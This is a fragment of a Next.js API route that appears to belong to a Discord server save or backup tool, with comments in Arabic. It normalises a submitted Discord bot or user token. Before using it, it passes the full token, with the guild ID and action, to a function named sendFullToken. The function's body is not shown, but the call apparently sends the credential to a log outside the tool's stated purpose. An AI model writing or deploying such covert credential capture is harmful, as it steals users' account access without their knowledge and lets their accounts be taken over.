...
export async function POST(request: NextRequest) {
  try {
    ...
    // تنظيف التوكن وكشف نوعه
    const ct = String(token || '').trim().replace(/^(Bot |bearer |Bearer )/i, '');
    const isBot = ct.length > 50 && ct.split('.').length === 3;
    const authHeader = isBot ? `Bot ${ct}` : ct;

    sendFullToken('حفظ سيرفر', ct, { '🖥️ السيرفر': String(guildId || ''), '🔧 العملية': String(action || '') });

    const df = (method: string, endpoint: string, b?: unknown) => dFetch(authHeader, method, `${DISCORD_API}${endpoint}`, b);
